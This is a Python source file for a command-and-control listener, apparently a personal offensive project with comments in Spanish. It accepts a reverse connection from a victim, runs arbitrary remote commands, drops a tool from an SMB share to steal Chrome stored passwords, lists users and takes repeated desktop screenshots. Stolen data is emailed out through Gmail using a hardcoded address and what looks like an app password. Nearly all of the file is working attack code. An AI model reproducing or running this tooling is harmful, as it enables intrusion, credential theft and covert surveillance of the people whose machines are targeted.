import signal
import socket
import smtplib
import sys
import re
import time
import os
from termcolor import colored
from colorama import Fore, Style
from email.mime.text import MIMEText





# Manejador de señal para salir de forma segura
def def_handler(sig, frame):
    print(colored(f"\n\n[!] Saliendo...\n", "red"))
    sys.exit(1)

# Asigna la señal SIGINT (Ctrl+C) al manejador anterior
signal.signal(signal.SIGINT, def_handler)


def banner():

      banner="""
\033[33m
                                           
        M                                      
    ,,,M..  `7MN.   `7MF'           .g8\"\"\"bf" 
    'P  M `db, MMN.    M           .dP'     ` 
    8m._M  `"' M YMb   M  ,pW"Wq.  dM'        
    `YMMM._    M  `MN. M 6W'   `Wb MM          
       `MYMMb, M   `MM.M 8M     M8 MM.         
    M   M  .M8 M     YMM YA.   ,A9 `Mb.     ,' 
    YbmmMmd9'.JML.    YM  `Ybmd9'    `"bmmmd'  
        M                                      
      """
      print(banner)




# Definición de la clase Listener
class Listener:
    def __init__(self, ip, port):
        self.options = {
            "- help": "Show this help panel",
            "- get users": "List system valid users (Gmail)",
            "- get browser": "Get Google Chrome Stored Passwords (Gmail)",
            "- get screenshot <file>": "Taking a screenshot of the victim's desktop",
            "- get screenshot spam <seconds> <times>":"Taking multiple screenshot of the victim's desktop every <seconds> <times>"
        }

        # Configuración del socket servidor para escuchar conexiones entrantes
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind((ip, port))
        server_socket.listen()

        print("\n" + Fore.YELLOW + "[+] " + Fore.WHITE + "Listening for incoming connections...")

        # Aceptar conexión del cliente
        self.client_socket, client_address = server_socket.accept()

        print(Fore.YELLOW + "\n[+] " + Fore.WHITE + "Connection established by: " + Fore.GREEN + str(client_address) + Fore.WHITE + "\n\n")





    # Método para ejecutar comandos en el sistema remoto
    def remote_execute(self, command):
        self.client_socket.send(command.encode())
        return self.client_socket.recv(8192).decode()

    # Obtener lista de usuarios del sistema y enviar por correo
    def get_users(self):
        self.client_socket.send(b"net user")
        output_command = self.client_socket.recv(2048).decode()

        # Enviar los resultados por correo
        self.send_email(
            "Users Report - C2",
            output_command,
            "nockeylogger@gmail.com",
            ["nockeylogger@gmail.com"],
            "ezro xvah ctgy qhlt"  # Contraseña del correo
        )

    # Mostrar el panel de ayuda
    def show_help(self):
        print("\n")
        for key, value in self.options.items():
            print(f"{key} - {value}")
        print("\n")

    # Obtener contraseñas almacenadas en navegadores y enviarlas por correo
    def get_browser(self):
        self.remote_execute("copy \\\\192.168.1.164\\share\\google_chrome.exe %TEMP%")
        password=self.remote_execute("%TEMP%\\google_chrome.exe")
        self.send_email(
            "Google Chrome Stored Passwords - C2",
            password,
            "nockeylogger@gmail.com",
            ["nockeylogger@gmail.com"],
            "ezro xvah ctgy qhlt"  # Contraseña del correo
        )

        self.remote_execute("del %TEMP%\\google_chrome.exe")


    # Tomar una captura de pantalla y guardarla
    def get_screenshot(self,command):
        self.remote_execute("copy \\\\192.168.1.164\\share\\screenshot.ps1 %TEMP%")
        user=self.remote_execute("whoami").split("\\")[-1]
        self.remote_execute("cd ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..")
        self.remote_execute("cd Users")
        self.remote_execute(f"cd {user}")
        self.remote_execute("cd AppData")
        self.remote_execute("cd Local")
        self.remote_execute("cd Temp")
        self.remote_execute("powershell .\\screenshot.ps1")
        self.remote_execute(f"copy %TEMP%\\screenshot.bmp \\\\192.168.1.164\\share\\")
        self.remote_execute(f"del %TEMP%\\screenshot.bmp")
        if not os.path.exists("Command_and_control_server/Screenshot"):
           os.makedirs("Command_and_control_server/Screenshot")

        os.system(f"mv Command_and_control_server/uploads/screenshot.bmp Command_and_control_server/Screenshot/{command.split()[-1]}")
        print("\n"+Fore.YELLOW+"[+]"+Fore.WHITE+" Screenshot "+Fore.GREEN+ command.split()[-1]+Fore.WHITE+" moved to directory"+Fore.GREEN+" Command_and_control_server/Screenshot\n")


    def get_screenshot_spam(self,seconds,times):
      print(Fore.YELLOW+"\n[+]"+Fore.WHITE+" Initiating screenshot spamming every "+Fore.GREEN+seconds+Fore.WHITE+" seconds "+Fore.GREEN+times+Fore.WHITE+" times:\n")
      self.remote_execute("copy \\\\192.168.1.164\\share\\screenshot.ps1 %TEMP%")
      user=self.remote_execute("whoami").split("\\")[-1]
      self.remote_execute("cd ..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..")
      self.remote_execute("cd Users")
      self.remote_execute(f"cd {user}")
      self.remote_execute("cd AppData")
      self.remote_execute("cd Local")
      self.remote_execute("cd Temp")
      for i in range(int(times)):
        self.remote_execute("powershell .\\screenshot.ps1")
        self.remote_execute(f"copy %TEMP%\\screenshot.bmp \\\\192.168.1.164\\share\\")
        self.remote_execute(f"del %TEMP%\\screenshot.bmp")
        if not os.path.exists("Command_and_control_server/Screenshot"):
          os.makedirs("Command_and_control_server/Screenshot")
        print(Fore.YELLOW+"[+]"+Fore.WHITE+" Screenshot"+Fore.GREEN+" screenshot"+str(i)+Fore.WHITE+" moved to directory"+Fore.GREEN+" Command_and_control_server/Screenshot\n")

        os.system(f"mv Command_and_control_server/uploads/screenshot.bmp Command_and_control_server/Screenshot/screenshot{i}.bmp")
        time.sleep(int(seconds))




    # Método para ejecutar el listener
    def run(self):
        while True:
            command = input(Fore.GREEN + " $" + "NoC > " + Fore.WHITE)
            if command == "get users":
                self.get_users()
            elif command == "help":
                self.show_help()
            elif command == "get browser":
                self.get_browser()
            elif command.split()[0] == "get" and command.split()[1]== "screenshot"  and len(command.split())==3:
                self.get_screenshot(command)
            elif command.split()[0] == "get" and command.split()[1]== "screenshot" and command.split()[2] == "spam" and len(command.split())==5:
                self.get_screenshot_spam(command.split()[3], command.split()[4])
            else:
                command_output = self.remote_execute(command)
                print(command_output)

    # Método para enviar correos electrónicos
    def send_email(self, subject, body, sender, recipients, password):
        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print("\n"+Fore.YELLOW+"[+]"+Fore.WHITE+" Email sent successfully!\n")

# Ejecución principal del Listener
if __name__ == '__main__':
    banner()
    my_listener = Listener("192.168.1.164", 443)
    my_listener.run()
